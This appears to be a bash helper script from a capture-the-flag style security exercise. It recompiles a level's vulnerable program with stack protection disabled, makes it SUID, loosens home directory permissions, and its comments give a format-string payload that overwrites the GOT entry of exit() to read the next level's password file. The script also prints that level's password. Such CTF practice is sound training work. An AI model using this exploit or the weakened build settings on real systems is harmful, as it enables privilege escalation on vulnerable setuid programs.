#!/bin/bash
# This script will allow to test the pseudo code in source.c file by copy it in the folder /tmp in the VM

# -------------------------------- PREREQUIRES -------------------------------- #
#                            From your local machine                            #
#       Copy the source and the script files in the tmp folder in your VM       #
#                  scp -P 4242 path/source.c level6@VM_IP:/tmp                  #
#                  scp -P 4242 path/script.sh level6@VM_IP:/tmp                 #
#                                                                               #
#     pwd: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31     #
#                                                                               #
#                                                                               #
#                                                                               #
#                   Don't forget to run it ;) bash script.sh                    #
# ----------------------------------------------------------------------------- #

# Compile the program
gcc -fno-stack-protector -Wno-format-security source.c -o ft_level5
# -fno-stack-protector : https://stackoverflow.com/questions/1345670/stack-smashing-detected
# -Wno-format-security : https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html

# Set SUID to give root user permissions
chmod u+s ft_level5

# Add write and execution permissions on home directory
chmod +wx ~

# Move the program to home directory
mv ft_level5 ~


# Then you have to run the program and cat .pass as level5 by taping manually these commands

#	su level5
#	// check the new address of function exit(), in this exemple it is 0x0804a014.
#	// And function o(), 0x080484c4 => 134513860 in dec (don't forget to sub 4 bytes cause of the exit() address in GOT)
#	python -c 'print "\x14\xa0\x04\x08" + "%134513856d%4$n"' > /tmp/exploit
#	cat /tmp/exploit - | /home/user/level6/ft_level5
#	cat /home/user/level6/.pass
